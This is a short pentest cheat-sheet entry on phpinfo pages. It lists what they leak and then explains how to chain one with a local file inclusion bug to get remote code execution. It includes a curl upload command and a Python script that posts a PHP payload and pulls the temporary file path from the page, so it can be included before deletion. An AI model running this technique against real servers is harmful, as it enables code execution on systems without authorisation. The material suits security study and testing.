# PHPInfo

<div class="row row-cols-lg-2"><div>

PHPInfo is a file that display information about the PHP configuration and sometimes the Apache configuration.

* It's sometimes hidden on webservers
* It's sometimes present on webservers with access control
* It can be created by exploiting a vulnerability

When using WAMP, it's available at `/?phpinfo=-1`.
</div><div>

We can usually find at least:

* 📚 The PHP Version
* 🗺️ The PHP Configuration <small>(allow_url_fopen, disable_functions, etc.)</small>
* 🧨 The List Of Enabled Modules <small>(XDebug, etc.)</small>
* ✍️ The `Hostname:Port` internally used by the webserver
* 🛣️ The `DOCUMENT_ROOT` of the webserver <small>(tune attacks)</small>
* ⚠️ The `Environment` variables, which can contain sensitive data
</div></div>

<hr class="sep-both">

## From LFI To RCE

<div class="row row-cols-lg-2"><div>

If we have access to a LFI and there is no suffix appended, such as `include('pages/'.$_GET['page'])`, we can exploit the PHPInfo via a Race Condition and the LFI to get a RCE.

* `curl "URL/phpinfo.php" -F "file=/path/to/shell.php"`
* `cat /tmp/fif3cd4is` contains the uploaded file
* The file is deleted when the request is completed
* The page "URL/phpinfo.php" contains the path to the uploaded file

On Linux, the path is fairly short so we can use `index = r.text.index(b"[tmp_name] =&gt"); path = r.text[i+17:i+31]`. On Windows, you must perform an initial test to avoid regexes.
</div><div>

```py
import requests
import re

tmp_name_pattern = re.compile(r'\[tmp_name]\s*=&gt;\s+(.*)')

r = requests.post(
    'http://localhost/phpinfo.php',
    files={
        'file': ('file', b'<?php /*YOUR PHP CODE*/ ?>')
    }
)
match = tmp_name_pattern.search(r.text)
path = match.group(1)
# Use {path} quickly in your LFI
```
</div></div>